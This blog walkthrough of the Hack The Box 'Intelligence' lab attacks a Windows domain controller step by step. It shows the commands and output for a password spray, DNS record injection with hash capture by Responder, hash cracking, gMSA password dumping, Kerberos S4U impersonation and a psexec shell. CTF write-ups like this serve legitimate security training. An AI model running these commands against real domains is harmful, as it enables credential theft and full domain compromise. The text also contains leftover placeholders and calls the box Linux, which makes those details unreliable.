---
layout: single
title: "Walktrough: HTB Intelligence"
namespace: htb-intelligence
category: Walkthrough
tags:
  - HackTheBox
  - HTB Medium
  - HTB Windows
date: 2021-07-03 16:00:00
header:
   teaser: https://i.imgur.com/T9F3vYj.png
---

Hello guys!

This week's machine will be **Intelligence**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [Micah](https://app.hackthebox.eu/users/22435). <!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Intelligence](https://i.imgur.com/LqQExlb.png){: .align-center}

add **Comment**

## Enumeration

As usual, started with a `nmap` quick scan to list published services in this box

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.248
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 16:20 -03
Nmap scan report for 10.10.10.248
Host is up (0.071s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-17 02:21:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-17T02:22:31+00:00; +7h00m02s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-17T02:22:32+00:00; +7h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-17T02:22:31+00:00; +7h00m02s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-08-17T02:22:32+00:00; +7h00m01s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-08-17T02:21:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.68 seconds
```

Based on the ports published, as well as some entries in `nmap` output, we might be dealing with a Domain Controller. The entries `dc.intelligence.htb` and `intelligence.htb` were added to the local hosts file to simplify name resolution.

### 80/TCP - HTTP Service

Starting with the HTTP page, noticed a simple web page, with dummy content, as we can see below.

![HTB Intelligence - HTTP Website](https://i.imgur.com/MtYAkP2.png){: .align-center}

On this page, there's a link to two PDF files, as well as some contact information in the footer, obtained from a `curl` call, as well as a `whatweb` enumeration, which confirmed the inexistence of a CMS running on this page

```bash
$ curl -L http://intelligence.htb | grep -Eo 'href=".*"|src=".*"' | awk -F" " '{print $1}' | awk -F"\"" '{print $2}' | sort -u
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7432  100  7432    0     0  48575      0 --:--:-- --:--:-- --:--:-- 48575
#!
documents/2020-01-01-upload.pdf
documents/2020-12-15-upload.pdf
documents/all.js
documents/bootstrap.bundle.min.js
documents/demo-image-01.jpg
documents/demo-image-02.jpg
documents/favicon.ico
documents/jquery.easing.min.js
documents/jquery.min.js
documents/scripts.js
documents/styles.css
#page-top
#signup

$ whatweb --color=never -a 3 10.10.10.248
http://10.10.10.248 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]
```

Downloaded the PDF files but nothing besides dummy data was found. Decided to check for metadata on those files, which could help us to identify users and other information, where I could get the account names `William.Lee` and `Jose.Williams`.

```bash
$ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:04:01 14:00:00-03:00
File Access Date/Time           : 2021:08:16 17:16:39-03:00
File Inode Change Date/Time     : 2021:08:16 17:16:48-03:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
                                                                                                                                 
$ exiftool 2020-12-15-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:04:01 14:00:00-03:00
File Access Date/Time           : 2021:08:16 17:16:39-03:00
File Inode Change Date/Time     : 2021:08:16 17:16:48-03:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

### 88/TCP - Kerberos Service

Now that we know two user accounts, according to [WADComs](https://wadcoms.github.io/), we can enumerate users using `kerbrute`, which allows us to enumerate users using Kerberos.

The first step was to create a wordlist, where I have placed three domain accounts that exists by default in the active directory plus the usernames we have found and I was able to confirm that these accounts existed.

```bash
$ cat users                                                                                                                     
Administrator
Guest
krbtgt
Jose.Williams
William.Lee

$ ./kerbrute_linux_amd64 userenum --dc intelligence.htb --domain intelligence.htb users

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 08/17/21 - Ronnie Flathers @ropnop

2021/08/17 11:11:19 >  Using KDC(s):
2021/08/17 11:11:19 >   intelligence.htb:88

2021/08/17 11:11:19 >  [+] VALID USERNAME:       Administrator@intelligence.htb
2021/08/17 11:11:19 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/08/17 11:11:19 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/08/17 11:11:19 >  Done! Tested 5 usernames (3 valid) in 0.074 seconds
```

The next step would be to try ASREPRoast, where using `GetNPUsers.py` we can check if some of these users contain the `UF_DONT_REQUIRE_PREAUTH` attribute set, but we had no luck this time.

```bash
$ /home/zurc/.pyenv/versions/2.7.18/bin/python GetNPUsers.py intelligence.htb/ -dc-ip 10.10.10.248 -usersfile validUsers -format hashcat                                                                   1 ⨯
/home/zurc/.pyenv/versions/2.7.18/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[-] User Administrator@intelligence.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams@intelligence.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee@intelligence.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Before brute-forcing the account's password decided to dig further into the web application to check for other documents or other web pages we could obtain additional information. The first step was to start a `gobuster` directory enumeration but haven't found anything useful there.

```bash
<add gobuster>
```

While analyzing what I already had so far, noticed two naming standards for documents and images, as below: one for images and another for uploaded documents.

```bash
$ ls -la ./loot
total 188
drwxr-xr-x 2 zurc zurc   4096 Aug 16 17:21 .
drwxr-xr-x 5 zurc zurc   4096 Aug 17 11:57 ..
-rw-r--r-- 1 zurc zurc  26835 Apr  1 14:00 2020-01-01-upload.pdf
-rw-r--r-- 1 zurc zurc  27242 Apr  1 14:00 2020-12-15-upload.pdf
-rw-r--r-- 1 zurc zurc  16538 Apr  1 14:00 demo-image-01.jpg
-rw-r--r-- 1 zurc zurc 105114 Apr  1 14:00 demo-image-02.jpg
```

To look for documents published there, wrote a simple Powershell script to check for documents and other images:

```powershell
#!/usr/bin/pwsh

$startDate = "01/01/2020"
$date = get-date($startDate)
$today = get-date

Write-Host ">> Enumerating Documents..."

while($date -lt $today){
    $strDate = $date.ToString("yyyy-MM-dd")
    Invoke-RestMethod -Method Head -Uri "http://intelligence.htb/documents/$strdate-upload.pdf" -StatusCodeVariable "scv" -SkipHttpErrorCheck | Out-Null
    if($scv -eq 200){
        Write-Output "[+] Found document $strDate-upload.pdf"
        Invoke-RestMethod -Method Get -Uri "http://intelligence.htb/documents/$strdate-upload.pdf" -OutFile "./$strDate-upload.pdf"
    }
    $date = $date.AddDays(1)
}

Write-Host ">> Enumerating Images..."

for ($i = 1; $i -lt 100; $i++) {
    $strCounter = '{0:d2}' -f $i
    Invoke-RestMethod -Method Head -Uri "http://intelligence.htb/documents/demo-image-$strCounter.jpg" -StatusCodeVariable "scv" -SkipHttpErrorCheck | Out-Null
    if($scv -eq 200){
        Write-Output "[+] Found image demo-image-$strCounter.jpg"
        Invoke-RestMethod -Method Get -Uri "http://intelligence.htb/documents/demo-image-$strCounter.jpg" -OutFile "./demo-image-$strCounter.jpg"
    }
}
```

Found a total of 99 documents and only the previously found 2 demo images.

```bash
PS /opt/dcruz/htb/intelligence-10.10.10.248/exploit> ./enumDocuments.ps1
>> Enumerating Documents...
[+] Found document 2020-01-01-upload.pdf
[+] Found document 2020-01-02-upload.pdf
[+] Found document 2020-01-04-upload.pdf
[+] Found document 2020-01-10-upload.pdf
[...]
[+] Found document 2021-03-25-upload.pdf
[+] Found document 2021-03-27-upload.pdf
>> Enumerating Images...
[+] Found image demo-image-01.jpg
[+] Found image demo-image-02.jpg
```

Checking file metadata for the downloaded files, found another list of users by running the following PowerShell snippet:

```powershell
$creator = @();
Get-ChildItem ./*.pdf | % {$creator += (exiftool $_.Name | ? {$_ -like '*Creator*'}).Split(": ")[1]};
$creator | select -Unique
```

```plaintext
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
John.Coleman
Brian.Morris
Thomas.Valenzuela
Travis.Evans
Samuel.Richardson
Richard.Williams
David.Mcbride
Anita.Roberts
Brian.Baker
Kelly.Long
Nicole.Brock
Kaitlyn.Zimmerman
Jason.Patterson
Darryl.Harris
David.Wilson
Teresa.Williamson
Ian.Duncan
Jessica.Moody
Tiffany.Molina
Thomas.Hall
```

This list was used again against `kerbrute userenum`, where all of them were found as valid and then, executed against `GetNPUsers.py` and again no eligible user was found :disappointed:.

To close this loop, decided to check the contents of each of those 99 PDF files downloaded and, to help with this task, found about `pdftotext` from `poppler-utils`, where the commands below were used, allowing me to find a new-account guide, containing a default password

```bash
$ for file in $PWD/*.pdf; do
for> pdftotext $file $file.txt
for> done

$ grep -r user ./*.txt
./2020-06-04-upload.pdf.txt:Please login using your username and the default password of:

$ cat 2020-06-04-upload.pdf.txt
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

Once many users don't change their password, made a password spray attack using `kerbrute` and found that user `Tiffany.Molina` still had the default password for her account.

```bash
$ ./kerbrute_linux_amd64 passwordspray --dc intelligence.htb --domain intelligence.htb users NewIntelligenceCorpUser9876

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 08/17/21 - Ronnie Flathers @ropnop

2021/08/17 14:01:17 >  Using KDC(s):
2021/08/17 14:01:17 >   intelligence.htb:88

2021/08/17 14:01:17 >  [+] VALID LOGIN WITH ERROR:       Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876     (Clock skew is too great)
2021/08/17 14:01:18 >  Done! Tested 33 logins (1 successes) in 0.629 seconds
```

### 445/TCP - SMB Service

Now that we have a valid user credential, the first thing to do was to enumerate the available shares, where I found shares **Users** and **IT**, besides the default shares.

```bash
$ smbmap -H intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[+] IP: intelligence.htb:445    Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
```

For the default Shares (`NETLOGON` and `SYSVOL`), nothing interesting was found. No Logon script on the existing policies, which appears to be Default Domain Policy and Default Domain Controllers Policy.

For Share **IT**, the only content is a Powershell Script called `downdetector.ps`, which checks for existing entries in DNS starting with **web*** and, if not responding to the requests, an e-mail is sent to **Ted.Graves@intelligence.htb**, which appears to be the System Administrator for Intelligence Company.

```bash
$ smbclient \\\\intelligence.htb\\IT -U Tiffany.Molina@intelligence.htb                                                         
Enter Tiffany.Molina@intelligence.htb's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 18 21:50:55 2021
  ..                                  D        0  Sun Apr 18 21:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 21:50:55 2021

                3770367 blocks of size 4096. 1443634 blocks available
smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
smb: \> exit
```

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
  try {
    $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
    if(.StatusCode -ne 200) {
    Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
    }
  } catch {}
}
```

The last share, **Users**, was exactly what I expected when saw it first: a sharing for the default user's directory (`C:\Users`), where I only was able to read Tiffany's Folder, where I found the `user.txt` file on her Desktop, obtaining the first flag.

```bash
$ smbclient \\\\intelligence.htb\\Users -U Tiffany.Molina@intelligence.htb
Enter Tiffany.Molina@intelligence.htb's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Apr 18 22:20:26 2021
  ..                                 DR        0  Sun Apr 18 22:20:26 2021
  Administrator                       D        0  Sun Apr 18 21:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 04:21:46 2018
  Default                           DHR        0  Sun Apr 18 23:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 04:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 04:11:27 2018
  Public                             DR        0  Sun Apr 18 21:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 22:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 21:51:46 2021

                3770367 blocks of size 4096. 1443378 blocks available
smb: \> cd Tiffany.Molina\Desktop\
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 21:51:46 2021
  ..                                 DR        0  Sun Apr 18 21:51:46 2021
  user.txt                           AR       34  Tue Aug 17 08:47:28 2021

                3770367 blocks of size 4096. 1443378 blocks available
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\> exit

$ cat user.txt
<redacted>
```

As we have Tiffany's credential, attempted to connect using PSEXEC and WinRM but none of these options worked. The path would be dug further in the recurrent schedule for `downdetector.ps1`.

Based on a deeper script analysis I figured out that I could be able to harvest another credential from a tool like `responder` but, in the first moment I need to find a way to modify DNS for the machine first, adding one entry to `web***` to our host.

Considering that the script is querying the entries via LDAP, this might be an Active Directory Integrated DNS Zone and it's accessible via LDAP. We can try to use the credentials we already own to include the desired entry and, for this task, after a lot of researching as I'm not very familiar with pentesting Active Directory, found a script called `dnstool.py`, part of [dirkjanm/krbrelayx: Kerberos unconstrained delegation abuse toolkit (github.com)](https://github.com/dirkjanm/krbrelayx).

```bash
$ python3 dnstool.py -u 'INTELLIGENCE\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --zone intelligence.htb --action add --record 'webattacker' -d 10.10.10.10 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/opt/dcruz/tools/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```

Right after adding this entry, started [lgandx/Responder](https://github.com/lgandx/Responder/), obtaining, after a few minutes, `Ted.Graves` NTLMv2 Hash

```bash
$ sudo responder -I tun0 -wrf
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[...]

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:15357668f1ebd83e:ACD060978EF61311F2CE21763ACE3077:010100000000000013030E6AD693D701362C5B4B410A5A890000000002000800530032003400330001001E00570049004E002D0058004D00310035005A0044004F004C004A00320047000400140053003200340033002E004C004F00430041004C0003003400570049004E002D0058004D00310035005A0044004F004C004A00320047002E0053003200340033002E004C004F00430041004C000500140053003200340033002E004C004F00430041004C00080030003000000000000000000000000020000068F6935683C481A71818EDA8E614418E5C95029DB4A04BC8056E41998622FC9F0A001000000000000000000000000000000000000900420048005400540050002F00770065006200610074007400610063006B00650072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Now with the NTLMv2 Hash of Ted, we can crack it using `hashcat`, returning the password **Mr.Teddy**

```bash
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt                                                                     hashcat (v6.1.1) starting...                                                                                                                                                                                                                                     OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                                                    =============================================================================================================================   * Device #1: pthread-Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz, 5845/5909 MB (2048 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

TED.GRAVES::intelligence:15357668f1ebd83e:acd060978ef61311f2ce21763ace3077:010100000000000013030e6ad693d701362c5b4b410a5a890000000002000800530032003400330001001e00570049004e002d0058004d00310035005a0044004f004c004a00320047000400140053003200340033002e004c004f00430041004c0003003400570049004e002d0058004d00310035005a0044004f004c004a00320047002e0053003200340033002e004c004f00430041004c000500140053003200340033002e004c004f00430041004c00080030003000000000000000000000000020000068f6935683c481a71818eda8e614418e5c95029db4a04bc8056e41998622fc9f0a001000000000000000000000000000000000000900420048005400540050002f00770065006200610074007400610063006b00650072002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TED.GRAVES::intelligence:15357668f1ebd83e:acd060978...000000
Time.Started.....: Tue Aug 17 16:17:42 2021 (21 secs)
Time.Estimated...: Tue Aug 17 16:18:03 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   497.7 kH/s (3.69ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10815488/14344385 (75.40%)
Rejected.........: 0/10815488 (0.00%)
Restore.Point....: 10813440/14344385 (75.38%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Ms.Jordan -> Moritz17

Started: Tue Aug 17 16:17:12 2021
Stopped: Tue Aug 17 16:18:05 2021
```

With his credentials, tried once again to connect using WinRM or PSEXEC but again had no success. Returned to LDAP enumeration where I used `windapsearch` with the parameters below, where I found one object under Computer Objects: **svc_int**

```bash
$ /opt/dcruz/tools/windapsearch/windapsearch.py -d intelligence.htb --dc-ip 10.10.10.248 -u ted.graves@intelligence.htb -p Mr.Teddy -G -U -PU -C --da --admin-objects --user-spns --unconstrained-users --unconstrained-computers

[...]

[+] Enumerating all AD computers
[+]     Found 2 computers:

cn: DC
operatingSystem: Windows Server 2019 Datacenter
operatingSystemVersion: 10.0 (17763)
dNSHostName: dc.intelligence.htb

cn: svc_int
dNSHostName: svc_int.intelligence.htb

[...]
```

The interesting point here is that this name doesn't appear to be a computer object, but a service account. Running the query again, identified that this object is a **Managed Service Account**

```bash
$ /opt/dcruz/tools/windapsearch/windapsearch.py -d intelligence.htb --dc-ip 10.10.10.248 -u ted.graves@intelligence.htb -p Mr.Teddy --custom '(name=svc*)'                                                49 ⨯
[+] Using Domain Controller at: 10.10.10.248
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=intelligence,DC=htb
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:intelligence\Ted.Graves
[+] Performing custom lookup with filter: "(name=svc*)"
[+]     ...success! Binded as:
[+]      u:intelligence\Ted.Graves
[+] Performing custom lookup with filter: "(name=svc_int*)"
[+]     Found 1 results:

CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
objectClass: msDS-GroupManagedServiceAccount
cn: svc_int
distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
instanceType: 4
whenCreated: 20210419004958.0Z
whenChanged: 20210817142958.0Z
uSNCreated: 12846
uSNChanged: 102571
name: svc_int
objectGUID: eaCA8SbzskmEoTSCQgjWQg==
userAccountControl: 16781312
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 132737254617174155
lastLogoff: 0
lastLogon: 132736841981495677
localPolicyFlags: 0
pwdLastSet: 132736825146913302
primaryGroupID: 515
objectSid: AQUAAAAAAAUVAAAARobx+nQXDcpGY+TMeAQAAA==
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: svc_int$
sAMAccountType: 805306369
dNSHostName: svc_int.intelligence.htb
objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
isCriticalSystemObject: FALSE
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132736841981495677
msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
msDS-SupportedEncryptionTypes: 28
msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAaAEAAAIAAAAIAAAAWa6dT0SPVr+SpfQILta2EQAAAAAiAAAAIgAAAGkAbgB0AGUAbABsAGkAZwBlAG4AYwBlAC4AaAB0AGIAAABpAG4AdABlAGwAbABpAGcAZQBuAGMAZQAuAGgAdABiAAAA
msDS-ManagedPasswordPreviousId: AQAAAEtEU0sCAAAAaAEAAAAAAAAAAAAAWa6dT0SPVr+SpfQILta2EQAAAAAiAAAAIgAAAGkAbgB0AGUAbABsAGkAZwBlAG4AYwBlAC4AaAB0AGIAAABpAG4AdABlAGwAbABpAGcAZQBuAGMAZQAuAGgAdABiAAAA
msDS-ManagedPasswordInterval: 30
msDS-GroupMSAMembership: AQAEgBQAAAAAAAAAAAAAACQAAAABAgAAAAAABSAAAAAgAgAABABQAAIAAAAAACQA/wEPAAEFAAAAAAAFFQAAAEaG8fp0Fw3KRmPkzOgDAAAAACQA/wEPAAEFAAAAAAAFFQAAAEaG8fp0Fw3KRmPkzHYEAAA=
```

Once this is a Group Managed Service Account and Ted Graves appear to be from IT in Intelligence, he might be able to read this group account password. Checking in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password) about Active Directory Attack, it mentions a tool for Linux called [micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper), which lists all passwords user/computer has access to, retrieving the output below

```bash
$ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb                                                           
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::5e47bac787e5e1970cf9acdb5b316239
```

As we now, have the account's password, we can try to authenticate to box **BUT**, one interesting point here is that Group Managed Service Accounts **don't allow interactive logon** so we're going to need to request a ticket and luckily get the command execution somehow.

Recurring to [WADComs](https://wadcoms.github.io) once again, found a script called `getST.py`, which allows me to request a Kerberos ticket for a specific SPN, which was obtained in the `windapsearch` output but has failed due to clock differences. After syncing the attacker machine with `ntpdate`, the ticket was issued with success

```bash
$ sudo ntpdate 10.10.10.248
18 Aug 00:46:33 ntpdate[151178]: step time server 10.10.10.248 offset +25195.212124 sec
                                                                                                                                 
$ impacket-getST -spn WWW/dc.intelligence.htb -dc-ip 10.10.10.248 -impersonate Administrator -hashes :5e47bac787e5e1970cf9acdb5b316239 intelligence.htb/svc_int$
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Once we have now a Kerberos ticket, we can use psexec to get command execution, being capable of reading `root.txt` file inside Administrator's profile

```bash
$ export KRB5CCNAME=Administrator.ccache
$ impacket-psexec -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file ymZRCcUo.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service LPhI on dc.intelligence.htb.....
[*] Starting service LPhI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop>type root.txt
<redacted>

c:\Users\Administrator\Desktop>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Stopping service LPhI.....
[*] Removing service LPhI.....
[*] Removing file ymZRCcUo.exe.....
```

I hope you guys have enjoyed it!

See you in the next post :smile:
